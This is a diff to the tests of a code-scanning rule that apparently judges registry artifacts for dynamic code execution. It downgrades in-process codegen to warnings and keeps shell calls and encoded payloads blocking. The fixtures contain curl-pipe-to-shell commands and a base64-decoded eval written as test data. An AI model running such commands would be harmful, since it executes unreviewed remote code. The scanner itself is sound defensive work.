@@ -54,18 +54,30 @@ const PAYLOAD = Buffer.from("curl -s http://192.0.2.1/x | sh").toString("base64"
 describe("no-dynamic-code-execution", () => {
   it.each([
     ["eval on a computed value", "run.js", 'eval(Buffer.from(b, "base64").toString());'],
-    ["new Function", "run.js", 'const f = new Function("a", "return a");'],
     ["exec on a built string", "run.js", `${CP}execSync(cmd + userInput);`],
     ["a shell pipeline", "run.js", `${CP}execSync("curl -s https://x.tld/p.sh | bash");`],
     ["sh -c", "run.js", `${CP}spawnSync("sh", ["-c", script]);`],
     ["python shell=True", "run.py", "subprocess.run(cmd, shell=True)"],
     ["python os.system", "run.py", "os.system(cmd)"],
-    ["python exec on a built string", "run.py", "exec(payload)"],
     ["a shell curl-pipe", "run.sh", "curl -fsSL https://x.tld/i.sh | sh"],
     ["a shell process substitution", "run.sh", "bash <(curl -s https://x.tld/i.sh)"],
   ])("fails on %s", async (_label, path, code) => {
     const r = await run(noDynamicCodeExecution, ctxFor({ [path]: code }));
     expect(r.status).toBe("fail");
+  });
+
+  // `new Function` and Python's `exec` moved out of the table above
+  // when blocking was narrowed to shells and encoded payloads. They are
+  // still findings and still cost score — they are just no longer
+  // grounds for removing an artifact from the registry, because
+  // building code in-process is a review burden rather than a
+  // demonstrated danger to whoever installs it.
+  it.each([
+    ["new Function", "run.js", 'const f = new Function("a", "return a");'],
+    ["python exec on a built string", "run.py", "exec(payload)"],
+  ])("warns on %s", async (_label, path, code) => {
+    const r = await run(noDynamicCodeExecution, ctxFor({ [path]: code }));
+    expect(r.status).toBe("warn");
   });
 
   it("does not read shell prose as Python — the tsumiki false positive", async () => {
@@ -115,7 +127,10 @@ describe("no-dynamic-code-execution", () => {
         "a.py": '"""We used to exec(x) here."""\nexec(compile(src, "<string>", "exec"))\n',
       }),
     );
-    expect(r.status).toBe("fail");
+    // Still reported — the point of this test is that the docstring
+    // does not suppress the real call below it. It warns rather than
+    // fails now only because in-process codegen stopped being blocking.
+    expect(r.status).toBe("warn");
   });
 
   it("allows eval on a literal, which stays visible to review", async () => {
@@ -414,6 +429,47 @@ describe("an unscanned language is never a clean bill of health", () => {
     const r = await run(
       noUndeclaredEgress,
       ctxFor({ "Main.java": 'String u = "https://198.51.100.4/x";' }),
+    );
+    expect(r.status).toBe("fail");
+  });
+});
+
+describe("dynamic execution blocks on danger, not on inconvenience", () => {
+  it.each([
+    ["python codegen", "gen.py", "exec(func_code, namespace)"],
+    ["new Function", "a.js", "const f = new Function(src);"],
+    ["vm module", "b.js", "vm.runInNewContext(src)"],
+  ])("warns rather than blocks for in-process %s", async (_n, path, code) => {
+    // Real finding, genuinely worth surfacing — but delisting a
+    // widely-used framework for a codegen idiom is a false accusation
+    // dressed as a safety verdict. lastmile-ai/mcp-agent builds pydantic
+    // models exactly this way and scored 44/FAIL before this split.
+    const r = await run(noDynamicCodeExecution, ctxFor({ [path]: code }));
+    expect(r.status).toBe("warn");
+  });
+
+  it.each([
+    ["shell string", "a.js", 'const { exec } = require("child_process"); exec("ls " + dir);'],
+    ["curl into sh", "i.sh", "curl -s https://x.example/i.sh | sh"],
+    ["shell=True", "c.py", "subprocess.run(cmd, shell=True)"],
+    ["decoded payload", "d.js", 'eval(Buffer.from(blob, "base64").toString());'],
+  ])("still blocks %s", async (_n, path, code) => {
+    // A shell turns a string into arbitrary commands; an encoded
+    // payload means the source cannot be reviewed at all. Those are
+    // demonstrated danger to whoever installs this, not review burden.
+    const r = await run(noDynamicCodeExecution, ctxFor({ [path]: code }));
+    expect(r.status).toBe("fail");
+  });
+
+  it("blocks when a shell finding hides among benign ones", async () => {
+    // The severity split must not become an escape hatch: one shell
+    // call among ten codegen calls is still a shell call.
+    const r = await run(
+      noDynamicCodeExecution,
+      ctxFor({
+        "gen.py": "exec(a)\nexec(b)\nexec(c)",
+        "run.py": "subprocess.run(cmd, shell=True)",
+      }),
     );
     expect(r.status).toBe("fail");
   });
